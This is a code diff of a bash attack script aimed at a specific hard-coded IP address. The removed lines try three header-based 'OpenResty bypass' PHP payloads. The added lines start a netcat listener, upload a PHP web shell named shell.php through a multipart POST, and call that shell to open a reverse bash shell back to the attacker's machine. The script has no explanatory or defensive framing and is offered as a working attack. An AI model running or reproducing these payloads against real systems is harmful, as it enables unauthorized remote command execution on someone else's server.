@@ -1,27 +1,11 @@
 #!/bin/bash
-TARGET="14.225.209.143:443"
 IP=$(curl -s ifconfig.me)
-PORT=4444
+nc -lvnp 4444 &
 
-echo "[+] OpenResty Bypass → ${IP}:${PORT}"
-nc -lvnp $PORT &
+curl -k -X POST \
+-H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" \
+--data-binary $'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET[cmd]); ?>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n' \
+"https://14.225.209.143:443/upload.php"
 
-# 🔥 BYPASS 1: Lua vars + php://input
-curl -k -s -X POST \
--H "X-Lua-Path: php://input" \
--H "Content-Length: 60" \
---data-binary "<?php system('bash -i >& /dev/tcp/$IP/$PORT 0>&1'); ?>" \
-"https://${TARGET}/"
-
-# 🔥 BYPASS 2: Location header injection
-curl -k -s \
--H "Location: php://input?-dallow_url_include=1" \
---data "<?php system('nc -e /bin/bash $IP $PORT'); ?>" \
-"https://${TARGET}/"
-
-# 🔥 BYPASS 3: OpenResty specific (content_by_lua)
-curl -k -s \
--H "X-Accel-Redirect: /?-d+auto_prepend_file=php://input" \
---data-binary "<?php eval(\$_POST[0]); ?>" \
--d "0=system('bash -i >& /dev/tcp/$IP/$PORT 0>&1');" \
-"https://${TARGET}/"
+# Trigger shell
+curl "https://14.225.209.143:443/shell.php?cmd=bash -i >& /dev/tcp/$IP/4444 0>&1"
